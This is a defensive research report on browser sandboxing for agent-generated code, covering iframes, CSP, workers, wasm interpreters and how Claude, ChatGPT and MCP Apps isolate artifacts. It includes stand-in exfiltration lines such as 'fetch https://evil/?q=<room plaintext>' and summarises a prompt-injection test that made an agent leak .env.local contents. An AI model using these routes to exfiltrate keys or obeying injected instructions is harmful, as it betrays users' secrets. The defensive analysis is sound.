# Browser-native sandboxing and isolation primitives for untrusted agent code (state as of Nov 2026)

Verification legend used throughout:
- **[V]** = checked against a page fetched or searched in this research session (Nov 2026).
- **[BK]** = from background knowledge (training data through mid-2026); the URL is the canonical primary source but was NOT re-fetched this session. Treat version numbers on [BK] lines as possibly stale.

Threat model assumed: attacker = another room member who can prompt-inject an agent, so that agent-generated code or tool calls are fully attacker-controlled. Assets = Nostr private keys and provider API tokens in the host origin's IndexedDB. Goals: (1) no direct read of host storage, (2) no exfiltration channel, (3) no confused-deputy use of host capabilities, (4) residual: Spectre-style cross-process/in-process memory reads, UI spoofing, resource exhaustion.

---

## 1. Iframe-based isolation, CSP, credentialless, Fenced Frames, Permissions Policy, COOP/COEP, Origin-Agent-Cluster, Site Isolation and Spectre

### Takeaway
The only widely-shipped primitive that removes untrusted code from the host's origin is an iframe that is either sandboxed without `allow-same-origin` (opaque origin) or served from a genuinely different site; everything else (CSP, Permissions Policy, COOP/COEP) is a supplementary restriction, not a boundary. Opaque origin stops storage reads but not exfiltration or Spectre: exfiltration needs CSP plus navigation controls, and Spectre resistance needs a cross-site frame in a browser with Site Isolation (desktop Chromium, desktop Firefox; not reliably Safari/iOS).

### Cited Findings

**Sandbox attribute / opaque origins**
- [V] Without the `allow-same-origin` token, a sandboxed iframe's content "is treated as being from a special origin that always fails the same-origin policy (potentially preventing access to data storage/cookies and some JavaScript APIs)." — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] Token list: allow-downloads, allow-forms, allow-modals, allow-orientation-lock, allow-pointer-lock, allow-popups, allow-popups-to-escape-sandbox, allow-presentation, allow-same-origin, allow-scripts, allow-storage-access-by-user-activation, allow-top-navigation, allow-top-navigation-by-user-activation, allow-top-navigation-to-custom-protocols. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] When the embedded document is same-origin with the embedder, combining `allow-scripts` and `allow-same-origin` is "strongly discouraged ... as that lets the embedded document remove the sandbox attribute — making it no more secure than not using the sandbox attribute at all." — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] "Sandboxing is useless if the attacker can display content outside a sandboxed iframe — such as if the viewer opens the frame in a new tab. Such content should be also served from a separate origin to limit potential damage." Popups opened from a sandboxed frame inherit the sandbox unless `allow-popups-to-escape-sandbox` is set. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] A `srcdoc` iframe's location is `about:srcdoc` and it uses the embedding document's URL as base URL. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] With `sandbox="allow-scripts"` the parent cannot read or reach into the iframe after creation, because the sandbox makes it cross-origin; without `allow-scripts` a sandboxed iframe runs no script at all. — [Joshua Rogers write-up](https://joshua.hu/rendering-sandboxing-arbitrary-html-content-iframe-interacting)
- [BK] `srcdoc`/`about:blank`/`blob:` documents inherit the CSP of the document that created them (policy container inheritance); `data:` URL iframes always get an opaque origin; a `blob:` URL carries the origin of its creator, and only gets an opaque origin when loaded in a frame sandboxed without `allow-same-origin`. — [HTML Standard, origin](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin), [CSP3 §inheriting](https://www.w3.org/TR/CSP3/#security-inherit-csp)

**CSP as the anti-exfiltration layer**
- [V] Simon Willison (3 Apr 2026) tested whether JS in a `sandbox="allow-scripts"` iframe can remove/disable a `<meta http-equiv="Content-Security-Policy">` injected at the top of the content. Result across Chromium and Firefox: meta CSP is enforced at parse time, cannot be removed by the frame's script, and persists even when the iframe navigates itself to a `data:` URI. His motivation was a Claude-Artifacts-style tool without a separate hosting domain. Safari is not mentioned as tested. — [simonwillison.net](https://simonwillison.net/2026/Apr/3/test-csp-iframe-escape/)
- [V] `frame-ancestors` and `sandbox` CSP directives cannot be set via a meta tag (report-uri likewise) — a header-delivered CSP on a separate domain is stronger than meta CSP. — [agentpatterns.ai](https://www.agentpatterns.ai/security/browser-sandbox-agent-generated-html/); [BK] primary: [MDN CSP meta](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)
- [V] Real-world example of an exfiltration-blocking CSP (Claude artifact frame, quoted by Pluto Security, Aug 2026): `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; connect-src 'self'; form-action 'self'; object-src 'none'; webrtc 'block'; frame-ancestors 'self' https://claude.ai https://*.claude.ai` (truncated in source). In their probe fetch, XHR, WebSocket, image beacon and sendBeacon were all blocked at the browser. — [Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)
- [BK] The iframe `csp` attribute (CSP Embedded Enforcement) lets an embedder require a policy on the embedded document; Chromium-only. — [MDN HTMLIFrameElement.csp](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp)
- [BK] CSP has no shipped directive restricting a document's own navigations (`navigate-to` was removed from CSP3); a frame's navigations are instead constrained by the *parent's* `frame-src`/`child-src`. — [CSP3](https://www.w3.org/TR/CSP3/#directive-frame-src)

**credentialless iframes**
- [V] `<iframe credentialless>` loads content "in a new, ephemeral context. It doesn't have access to the network, cookies, and storage data associated with its origin"; in return COEP embedding rules are lifted. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] Support: Chrome/Edge since 110; Safari (incl. iOS) unsupported through 26.5/27.x listings; Firefox unsupported, vendor position unknown. — [caniuse](https://caniuse.com/wf-iframe-credentialless), [web-features explorer](https://web-platform-dx.github.io/web-features-explorer/features/iframe-credentialless), [Mozilla bug 1863531](https://bugzilla.mozilla.org/show_bug.cgi?id=1863531)

**Fenced Frames**
- [V] Chrome is removing them: an Aug 2026 blink-dev "Intent to Ship: Remove FencedFrame element and window.fence APIs" plans stubs in M154 then removal, following removal of Protected Audience/selectURL; usage ~0.07% of page loads. Privacy Sandbox status page (Oct 2025) already listed Fenced Frames for phase-out. — [blink-dev](https://groups.google.com/a/chromium.org/g/blink-dev/c/c9w5uH3eSuo/), [Privacy Sandbox update](https://privacysandbox.google.com/blog/update-on-plans-for-privacy-sandbox-technologies)

**Permissions Policy**
- [V] MCP Apps maps declared `camera`, `microphone`, `geolocation`, `clipboardWrite` to Permissions Policy features granted through the inner iframe's `allow` attribute; Claude's artifact frames deny camera/microphone/geolocation. — [MCP Apps spec](https://raw.githubusercontent.com/modelcontextprotocol/ext-apps/main/specification/2026-01-26/apps.mdx), [Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)
- [BK] The iframe `allow` attribute delegates powerful features per frame; default for most is `self` only, so cross-origin/opaque frames get none unless delegated. — [MDN Permissions Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Permissions_Policy)

**COOP/COEP, cross-origin isolation, Origin-Agent-Cluster**
- [BK] `Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp|credentialless` yields `crossOriginIsolated`, unlocking `SharedArrayBuffer` and high-resolution timers; these are gated precisely because they make Spectre attacks practical. — [web.dev why COOP/COEP](https://web.dev/articles/why-coop-coep)
- [BK] `Origin-Agent-Cluster: ?1` requests origin-keyed agent clusters (disables `document.domain`, hints the browser to isolate by origin instead of site); it is a hint, not a guaranteed process boundary. — [MDN Origin-Agent-Cluster](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Origin-Agent-Cluster)

**Site Isolation / Spectre**
- [V] Anthropic's own description of Artifacts (2024): "iFrame sandboxes with full-site process isolation" plus "strict Content Security Policy (CSP) to enforce limited and controlled network access". — [Simon Willison quoting Pragmatic Engineer](https://www.simonwillison.net/2024/Aug/28/how-anthropic-built-artifacts)
- [BK] Chromium's post-Spectre threat model: assume any code in a renderer process can read all memory in that process; the defensible boundary is the process, and Site Isolation puts different *sites* (scheme + eTLD+1) in different processes on desktop; Android applies it more selectively. — [Chromium side-channel threat model](https://chromium.googlesource.com/chromium/src/+/main/docs/security/side-channel-threat-model.md), [Site Isolation](https://www.chromium.org/Home/chromium-security/site-isolation/)

### Inferences
- For Beamhop, opaque-origin sandbox (`sandbox="allow-scripts"`, no `allow-same-origin`) fully addresses goal (1): IndexedDB/localStorage/OPFS/cookies of the host are unreachable by API. It does not address (2): an opaque-origin frame can still `fetch()` anywhere, load images, open WebSockets, and navigate itself to `https://evil/?d=...` unless blocked.
- A complete exfiltration block needs all of: CSP inside the frame (`default-src 'none'`, `connect-src 'none'`, no remote img/media/font/script, `form-action 'none'`, `webrtc 'block'` where supported); no `allow-popups`, `allow-top-navigation*`, `allow-forms`, `allow-downloads` sandbox tokens; and a host-page CSP `frame-src` restricting where the child frame can navigate (e.g. only `blob:`/`data:`/the sandbox origin). The last item is frequently missed; Willison's finding that meta CSP survives navigation to `data:` helps but does not cover navigation to an attacker HTTPS URL carrying data in the query string.
- CSP inheritance cuts both ways: a `srcdoc` frame inherits the host's CSP (so a strict host CSP constrains it), but meta-delivered CSP inside the generated HTML depends on the host injecting it before any attacker bytes.
- Because Chromium treats same-process memory as readable under Spectre, an opaque-origin `srcdoc`/`blob:` frame is a weaker boundary than a cross-site frame unless the browser also process-isolates sandboxed frames. A different *site* for the sandbox is the only configuration with a strong process-isolation story, and only on browsers with Site Isolation.
- Do NOT enable cross-origin isolation (COOP/COEP, e.g. via coi-serviceworker) on the document that holds keys if untrusted code shares its process: it hands the attacker `SharedArrayBuffer` high-resolution timers. If wasm threads are needed, enable isolation only for the sandbox document.
- `credentialless` is not useful as the primary control: Chromium-only, and it removes credentials/storage rather than isolating the embedder. Fenced Frames should be ignored entirely (being removed).
- Residual risks no primitive solves: UI spoofing/phishing inside the frame (e.g. a fake "paste your nsec" form), CPU/memory exhaustion (main-thread frame can hang the tab if same-process), and confused-deputy abuse of whatever postMessage API the host exposes.

### Gaps
- Whether Chrome now process-isolates sandboxed (opaque-origin) same-site iframes by default on all platforms ("IsolateSandboxedIframes") was not verified this session; I recall it shipping on desktop around 2023–2024 but have no fetched source.
- Safari/WebKit Site Isolation shipping status as of Nov 2026 was not verified; as of my background knowledge it was under development and not enabled by default, meaning on iOS/macOS Safari cross-site iframes may share a process with the host. Firefox Fission is on by default on desktop; Android status not verified.
- CSP `webrtc` directive support outside Chromium not verified.
- Did not verify Document-Isolation-Policy (Chromium, ~137) status, which gives per-document cross-origin isolation without COOP/COEP.
- Safari behavior for the meta-CSP-cannot-be-removed result was not tested in the cited research.

---

## 2. Workers, ShadowRealm, SES/Hardened JS, QuickJS-in-wasm, wasm capability sandboxes, Figma, Cloudflare Code Mode

### Takeaway
Workers are concurrency units, not security boundaries: they keep the creating origin and can open the same IndexedDB. Language-level sandboxes split into same-realm object-capability systems (SES/Compartments, the ShadowRealm proposal, still unshipped at Stage 2.7) and separate-VM interpreters (QuickJS compiled to wasm), with Figma's 2019 switch from the former to the latter being the canonical lesson; Cloudflare's Dynamic Worker Loader is the server-side model for "code mode" and has no native browser equivalent, so the browser analog must be assembled from iframe + worker/wasm + capability RPC.

### Cited Findings

**Workers**
- [BK] Dedicated/Shared/Service workers run in the origin of the script that created them; `WorkerGlobalScope` exposes `indexedDB`, `fetch`, `caches`, `WebSocket`, OPFS; they lack DOM and `localStorage`. — [MDN Web Workers API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers), [MDN functions available to workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers)
- [V] Val Town on its own history: a Web Workers-based sandbox "is not as isolated or safe as the runtime strategy that we use today, which uses process isolation as well"; Val Town earlier used vm2 (same process as the parent program) before moving to a Deno-based runtime. — [Val Town blog](https://blog.val.town/blog/val-town-town), [healeycodes](https://healeycodes.com/sandboxing-javascript-code), [Simon Willison](https://www.simonwillison.net/2024/Feb/8/the-first-four-val-town-runtimes)

**ShadowRealm**
- [V] The spec draft is labeled "Stage 2.7 Draft / February 10, 2025"; the proposal reached Stage 3 in July 2021 and was later moved back over unfinished HTML/web integration (which Web APIs exist inside a ShadowRealm). No 2026 plenary advancement found; some 2026 aggregator pages claiming Stage 3 look unreliable. — [tc39.es/proposal-shadowrealm](https://tc39.es/proposal-shadowrealm), [Igalia Feb 2025 plenary summary](https://blogs.igalia.com/compilers/2025/03/27/summary-of-the-february-2025-tc39-plenary/), [Mozilla bug 1566145](https://bugzilla.mozilla.org/show_bug.cgi?id=1566145)
- [BK] The ShadowRealm explainer states it provides integrity (separate globals/intrinsics, callable-boundary membrane) and is explicitly not a confidentiality or availability boundary: same thread, same process, same heap. — [explainer](https://github.com/tc39/proposal-shadowrealm/blob/main/explainer.md)

**SES / Hardened JavaScript / Endo / LavaMoat**
- [BK] Hardened JS (`ses` package, Agoric/Endo): `lockdown()` freezes all intrinsics, `Compartment` evaluates code with a separate global object and only explicitly endowed capabilities; `harden()` deep-freezes API surfaces. Code runs in the same realm/heap as the host. — [endojs/endo ses](https://github.com/endojs/endo/tree/master/packages/ses), [hardenedjs.org](https://hardenedjs.org/)
- [BK] LavaMoat applies SES compartments per npm package with a policy file for supply-chain containment (MetaMask). MetaMask Snaps run untrusted snap code under SES inside an isolated iframe execution environment, i.e. SES layered on top of an iframe rather than relied on alone. — [LavaMoat](https://github.com/LavaMoat/LavaMoat), [MetaMask Snaps execution environment](https://docs.metamask.io/snaps/learn/about-snaps/execution-environment/)

**Figma plugin sandbox**
- [V] Figma (post dated 2 Oct 2019; new runtime shipped 25 Sep 2019): several independent vulnerabilities in the Realms shim "could have allowed code inside the sandbox to escape"; the bug class was the shim confusing objects inside and outside the sandbox because both lived on the same JS VM. Figma switched to QuickJS (C JavaScript VM) compiled to WebAssembly, where inside/outside object representations are too different to confuse; described as "intrinsically more secure" though "somewhat slower for certain plugins". No evidence of exploitation was found. — [Figma: An update on plugin security](https://www.figma.com/blog/an-update-on-plugin-security/)
- [BK] Figma's architecture: plugin logic runs in the main-thread sandbox with access to a scene-graph API object only; plugin UI runs in a separate `<iframe>` with browser APIs but no document access; the two talk by message passing. — [Figma: How to build a plugin system on the web](https://www.figma.com/blog/how-we-built-the-figma-plugin-system/)

**QuickJS-in-wasm and wasm as a capability sandbox**
- [BK] `quickjs-emscripten` exposes QuickJS compiled to wasm with per-runtime memory limits, interrupt handlers (CPU budget), and host functions injected explicitly; guest code has no `fetch`, DOM or storage unless the host provides them. — [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- [BK] A wasm module has no ambient authority: it can only touch its linear memory and call imported functions. WASI 0.2 (Jan 2024) defines capability-style interfaces on the Component Model; `jco` transpiles components to ES modules + core wasm so they run in browsers, with WASI imports satisfied by JS shims the embedder chooses. — [WebAssembly security](https://webassembly.org/docs/security/), [bytecodealliance/jco](https://github.com/bytecodealliance/jco), [WASI 0.2](https://bytecodealliance.org/articles/WASI-0.2)

**Cloudflare Code Mode / Dynamic Worker Loader**
- [V] The Worker Loader API "allows a Cloudflare Worker to instantiate a new Worker at runtime with dynamically specified code, each running in its own isolated sandbox"; isolates start in milliseconds and can be created per snippet and discarded. Open beta announced 24 Mar 2026. — [Cloudflare docs](https://developers.cloudflare.com/workers/runtime-apis/bindings/worker-loader), [changelog](https://developers.cloudflare.com/changelog/post/2026-03-24-dynamic-workers-open-beta), [blog](https://blog.cloudflare.com/dynamic-workers)
- [V] Code Mode (Sept 2025): the agent writes code against a typed API instead of emitting many tool calls; Cloudflare claims up to 80% savings in inference tokens. The sandbox can intercept outbound HTTP for credential injection, "adding auth tokens on the way out so the agent code never sees secret credentials directly". — [Cloudflare blog](https://blog.cloudflare.com/dynamic-workers), [InfoQ Apr 2026](https://infoq.com/news/2026/04/cloudflare-dynamic-workers-beta)
- [V] `@cloudflare/codemode` v0.1.0 (20 Feb 2026) was rewritten as a "runtime agnostic modular architecture". — [Cloudflare changelog](https://developers.cloudflare.com/changelog/post/2026-02-20-codemode-sdk-rewrite/)
- [V] Critique in trade press: isolates are not full computers and are argued to be a weaker boundary than microVMs; a sandbox alone does not solve prompt injection. — [VentureBeat](https://venturebeat.com/infrastructure/cloudflares-new-dynamic-workers-ditch-containers-to-run-ai-agent-code-100x)

### Inferences
- A Worker spawned from the host origin is worthless against key theft (it can call `indexedDB.open()` on the host DB). A Worker spawned *inside* an opaque-origin sandboxed iframe inherits the opaque origin, so "sandboxed iframe -> worker" gives both origin isolation and an off-main-thread, terminable execution unit (`worker.terminate()` is the practical kill switch for runaway code).
- The Figma lesson generalizes: same-realm sandboxes (SES, Realms shims, ShadowRealm) have a large attack surface in the membrane and offer zero Spectre/availability protection; they should only be used as defense in depth inside an iframe, never as the sole boundary around key material. This matches MetaMask's layering.
- QuickJS-wasm (or Pyodide) gives the strongest *language-level* guarantee available in a single origin: deny-by-default capabilities, memory cap, interruptible execution, no DOM. It still shares the host process (Spectre-relevant only if timers/SAB are exposed to the guest; do not endow high-resolution time), and it cannot render UI. It is the best fit for "agent runs a computation/tool script", while iframes are the fit for "agent produces interactive UI".
- The browser analog of Cloudflare's Dynamic Worker Loader + bindings is: host creates a fresh sandbox per task (opaque iframe + worker, or a QuickJS context), passes only explicit capability stubs over a `MessageChannel`, and performs credentialed network calls itself. Credential injection on egress is exactly what Beamhop needs: generated code calls `tools.llm(...)` or `tools.fetch(allowlistedHost)` and the host attaches the provider token; the token never crosses the boundary.
- Even with perfect isolation, any capability granted (send room message, call LLM with user's key, fetch URL) is a confused-deputy and exfiltration channel under prompt injection: e.g. "fetch https://evil/?q=<room plaintext>" via an allowed fetch tool. Egress allowlists and per-call user approval for sensitive tools are needed on the host side; isolation only makes the host API the single choke point.

### Gaps
- No browser ships ShadowRealm by default that I could confirm; implementation status behind flags (WebKit had one) not verified this session.
- TC39 Compartments/"module harmony" proposal stages not verified.
- WASI 0.3 (native async) release status and jco support for it not verified.
- Whether Cloudflare's Cap'n Web (`capnweb`) postMessage transport is production-ready for in-browser iframe RPC was not verified; I recall it supporting MessagePort transports.
- Val Town's current client-side preview isolation details not found.

---

## 3. How real products isolate generated code; what MCP Apps specifies

### Takeaway
Every major product converged on the same pattern: generated code runs in an iframe on a dedicated "usercontent" registrable domain (often a unique subdomain per artifact/app), under a header-delivered CSP with `connect-src` locked down, and talks to the host only via an audited postMessage bridge that holds no credentials. MCP Apps (SEP-1865) codifies this as a mandatory double-iframe "sandbox proxy" on a different origin from the host, with deny-by-default CSP built from server-declared domains.

### Cited Findings

**Claude Artifacts**
- [V] Each web artifact is served from its own origin `<uuid>.frame.claudeusercontent.com`, not from claude.ai; artifacts cannot see each other. — [Pluto Security, 6 Aug 2026](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)
- [V] CSP (header): `script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:`, `connect-src 'self'`, `form-action 'self'`, `object-src 'none'`, `webrtc 'block'`, `frame-ancestors 'self' https://claude.ai https://*.claude.ai`; fetch/XHR/WebSocket/image beacon/sendBeacon to an external collector were all blocked. — [Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)
- [V] Connector (MCP) access from artifacts goes through a bridge that is "a message-passing stub holding no token"; calls are issued by the parent page under the *viewer's* session, per-connector opt-in per page; artifacts declaring connectors cannot be made public. — [Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)
- [V] Weaknesses identified are outside the sandbox boundary: no server-side content review; in a prompt-injection test the agent published `.env.local` contents inside an artifact in 10 of 85 attempts; model-written approval dialog text; free-plan public artifacts indexable. — [Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)
- [V] User reports: a Chrome extension exists to disable CSP in Claude artifacts; a feature request notes CSP/sandboxing does nothing against social engineering from a trusted-looking domain. — [claude-code issue 49182](https://github.com/anthropics/claude-code/issues/49182), [issue mirror](https://claudeissues.com/issue/77409-feature-request-harden-published-artifacts-against-trusted-domain-social-enginee)

**ChatGPT apps (Apps SDK) / OpenAI sandbox domain**
- [V] ChatGPT renders apps in a "three-layer iframe architecture": two nested `web-sandbox.oaiusercontent.com` iframes wrapping the app's HTML (outer sandbox proxy on a different origin with a configured CSP, inner frame with the untrusted app). — [Vercel](https://vercel.com/blog/running-next-js-inside-chatgpt-a-deep-dive-into-native-app-integration), [reverse-engineering post](https://dev.to/infoxicator/i-reverse-engineered-chatgpt-apps-iframe-sandbox-2ok3), [AI Engineer Europe 2026 talk "Why MCP & ChatGPT apps use double iframes"](https://www.ai.engineer/talks/c-2eEv2ou7Y-why-mcp-chatgpt-apps-use-double-iframes)
- [V] Published apps get a per-app sandbox origin like `yourapp.web-sandbox.oaiusercontent.com` (scoped by `_meta.ui.domain`); `openai/widgetCSP` `connect_domains` -> `connect-src`, `resource_domains` -> style/img/font/media sources, `frameDomains` -> `frame-src`. — [dev.to CSP explainer](https://dev.to/cptrodgers/mcp-app-csp-explained-why-your-widget-wont-render-9n1), [OpenAI Apps SDK security guide](https://developers.openai.com/apps-sdk/guides/security-privacy)
- [V] Developers report CSP inconsistencies after redeploys and declared domains missing from the iframe CSP (forum reports, not verified). — [OpenAI community](https://community.openai.com/t/published-apps-sdk-widget-updates-csp-behavior-inconsistent-after-redeploy-anyone-else-seeing-this/1381690), [OpenAI community 2](https://community.openai.com/t/view-csps-not-sourced-anymore-for-apps-published-in-store/1385052)

**MCP Apps (SEP-1865; spec version 2026-01-26, repo modelcontextprotocol/ext-apps)**
- [V] "The Host and the Sandbox MUST have different origins." All View content MUST render in sandboxed iframes. The sandbox proxy iframe must have `allow-scripts` and `allow-same-origin`; it signals `ui/notifications/sandbox-proxy-ready`, then the host sends HTML via `ui/notifications/sandbox-resource-ready`; the proxy loads it in an inner iframe under a CSP derived from resource metadata. The spec gives no fixed inner `sandbox` attribute value (overridable via a `sandbox` field). — [MCP Apps spec](https://raw.githubusercontent.com/modelcontextprotocol/ext-apps/main/specification/2026-01-26/apps.mdx)
- [V] Default CSP when `ui.csp` is omitted: `default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; media-src 'self' data:; connect-src 'none';`. `connectDomains` -> `connect-src`; `resourceDomains` -> img/script/style/font/media-src; `frameDomains` -> `frame-src`; `baseUriDomains` -> `base-uri`; `object-src 'none'`. Hosts MUST build CSP from declared domains, MAY restrict further, MUST NOT allow undeclared domains, SHOULD log CSP configs. — [MCP Apps spec](https://raw.githubusercontent.com/modelcontextprotocol/ext-apps/main/specification/2026-01-26/apps.mdx)
- [V] Transport is JSON-RPC 2.0 over postMessage; the host acts as MCP server to the View, MUST validate/reject malformed messages, SHOULD log View-initiated RPC, MAY block messages or require user approval, must not message the View before its `initialized` notification. Listed threats: malicious server HTML, sandbox escape, unauthorized tool execution, host data exfiltration, phishing. Hosts SHOULD visually mark sandbox boundaries and apply CPU/memory limits. — [MCP Apps spec](https://raw.githubusercontent.com/modelcontextprotocol/ext-apps/main/specification/2026-01-26/apps.mdx)
- [V] Spec inconsistency: a security-section example uses `connect-src 'self'` while metadata rules say empty `connectDomains` means no connections. — [MCP Apps spec](https://raw.githubusercontent.com/modelcontextprotocol/ext-apps/main/specification/2026-01-26/apps.mdx)

**Gemini Canvas**
- [V] Google's help pages document sharing/data semantics rather than the sandbox: anyone with a public link to a multi-user Canvas app can view and edit all its data; Gemini provisions a Firestore instance for apps needing persistence. — [Google support: Canvas safety](https://support.google.com/gemini/answer/16419134?hl=en-GB)

**Val Town**
- [V] A Val Town demo (Steve Krouse) used "the simplest possible version of an iframe sandbox using srcDoc"; server-side vals run on a Deno-based runtime with process isolation. — [Simon Willison](https://simonwillison.net/tags/val-town), [Val Town blog](https://blog.val.town/blog/val-town-town)

**Open WebUI (open-source reference)**
- [V] Open WebUI documents artifacts rendered in iframes with configurable sandbox behavior. — [Open WebUI docs](https://docs.openwebui.com/features/chat-conversations/chat-features/code-execution/artifacts.md)

### Inferences
- The reason for the double iframe: a host page cannot attach an HTTP-header CSP to HTML it injects via `srcdoc`, and an inner frame needs a real (non-host) origin to get `'self'`, storage and workers. The outer proxy document lives on the sandbox origin, receives raw HTML by postMessage, and creates the inner frame with the computed CSP, so untrusted markup never executes in a document whose origin or CSP the host shares. A static site can replicate this with a tiny static `proxy.html` on a second domain.
- Per-artifact subdomains (Claude, ChatGPT) exist to isolate artifacts from *each other* (storage, service workers). On a single shared sandbox origin, every agent's code shares storage unless frames are opaque-origin; for Beamhop, opaque inner frames avoid needing wildcard subdomains.
- All the published weaknesses are at the bridge/consent/content layer, not the browser boundary. This predicts where Beamhop's risk concentrates: the tool API exposed over postMessage, approval UX, and what plaintext is handed to the sandbox.
- Claude's "viewer's own session, per-connector opt-in" rule is the right template for multi-user rooms: an agent artifact authored via one member's prompt must never run with another member's credentials without that member's explicit grant.

### Gaps
- Gemini Canvas iframe origin/sandbox attributes: no primary source found (my recollection of a `*.usercontent.goog` frame is unverified).
- websim, tldraw computer, Observable: no sources found this session. Background knowledge (unverified): Observable runs notebook code in an iframe on a separate `observableusercontent.com` domain; websim serves generated sites from per-site subdomains.
- Hugging Face: not searched. Background knowledge (unverified): each Space is served from its own `*.hf.space` subdomain (static Spaces on `*.static.hf.space`) and embedded by iframe in huggingface.co; Gradio-lite runs Pyodide in a Web Worker in the embedding page's own origin, i.e. no isolation from the embedding page beyond a worker.
- ChatGPT Canvas (as opposed to Apps SDK) code-preview isolation details not verified.
- Exact `sandbox` attribute tokens used by Claude and ChatGPT frames not captured.
- MCP-UI (the community predecessor) not separately researched; its concepts were folded into MCP Apps.

---

## 4. Getting a separate origin for sandboxed content from a single static github.io project page

### Takeaway
Three zero-cost options exist, in increasing strength: (a) opaque origin via `sandbox` on `srcdoc`/`blob:`/`data:` frames with meta CSP (works today on one origin, no header control, same-process on most browsers); (b) service-worker-synthesized responses that add real headers such as `Content-Security-Policy: sandbox` (works within the SW scope, with first-load and bypass caveats); (c) a second free static host on a different registrable domain acting as the sandbox-proxy origin, which is the only option that gets Site Isolation and real header CSP. A github.io project page also has a pre-existing hazard: it shares its origin with every other Pages site of the same user/org.

### Cited Findings
- [V] Opaque origin via the sandbox attribute works for inline content: MDN's own example is `<iframe sandbox srcdoc="...">`; the frame is treated as a special origin that always fails same-origin checks. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] Meta-tag CSP inside a sandboxed frame is tamper-proof against the frame's own script in Chromium and Firefox (enforced at parse time; persists across navigation to `data:`), explicitly investigated as a way to avoid a separate hosting domain. — [Simon Willison, Apr 2026](https://simonwillison.net/2026/Apr/3/test-csp-iframe-escape/)
- [V] Limits of meta CSP: `frame-ancestors` and `sandbox` directives cannot be delivered by meta tag; header delivery from a separate domain (Claude's approach) is stronger. — [agentpatterns.ai](https://www.agentpatterns.ai/security/browser-sandbox-agent-generated-html/)
- [V] If sandboxed content can be opened outside the frame (new tab) it runs with the hosting origin's full privileges, so it "should be also served from a separate origin". — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [BK] `coi-serviceworker` demonstrates the header-injection technique on GitHub Pages: a service worker intercepts navigations and re-emits responses with added COOP/COEP headers, reloading once on first visit. — [gzuidhof/coi-serviceworker](https://github.com/gzuidhof/coi-serviceworker)
- [BK] `github.io` is on the Public Suffix List, so `alice.github.io` and `bob.github.io` are different *sites* (cross-site, separately process-isolated, separate storage partitions), while `alice.github.io/app1` and `alice.github.io/app2` are the same origin. — [Public Suffix List](https://publicsuffix.org/list/public_suffix_list.dat), [GitHub Pages docs](https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages)
- [BK] The CSP `sandbox` directive applied by response header gives a document an opaque origin even on top-level navigation. — [MDN CSP sandbox](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox)
- [BK] Other free static hosts allow custom response headers via a `_headers` file (Cloudflare Pages on `pages.dev`, Netlify on `netlify.app`), both suffixes being on the PSL. — [Cloudflare Pages headers](https://developers.cloudflare.com/pages/configuration/headers/), [Netlify headers](https://docs.netlify.com/routing/headers/)

### Inferences
- Recommended layering for Beamhop with no infrastructure change: host page creates `<iframe sandbox="allow-scripts" srcdoc=...>` (or a `blob:` URL) whose first bytes are a host-authored `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' blob:; style-src 'unsafe-inline'; img-src data: blob:; connect-src 'none'; form-action 'none'">`, plus host-page meta CSP with `frame-src blob: data:` (or `'self'`) to stop the frame navigating itself to an attacker URL. `data:`/`blob:` content cannot be "opened in a new tab" as a host-origin document in a harmful way when it is only ever a string, which sidesteps MDN's warning; never write generated HTML to a real same-origin URL (including the Cache API behind a service worker route) without `CSP: sandbox`.
- Service-worker header injection can upgrade this: the SW answers `/<repo>/sandbox/<id>` with generated content plus headers `Content-Security-Policy: sandbox allow-scripts; default-src 'none'; ...`. Benefits: real header CSP (including the `sandbox` directive, so even top-level navigation yields an opaque origin) and a real URL. Caveats: nothing protects the first uncontrolled load or a hard reload (Shift+Reload bypasses the SW); if the path does not exist on the server the failure mode is a harmless 404; the SW itself is host-origin code and becomes part of the TCB; project-page scope is limited to `/<repo>/`.
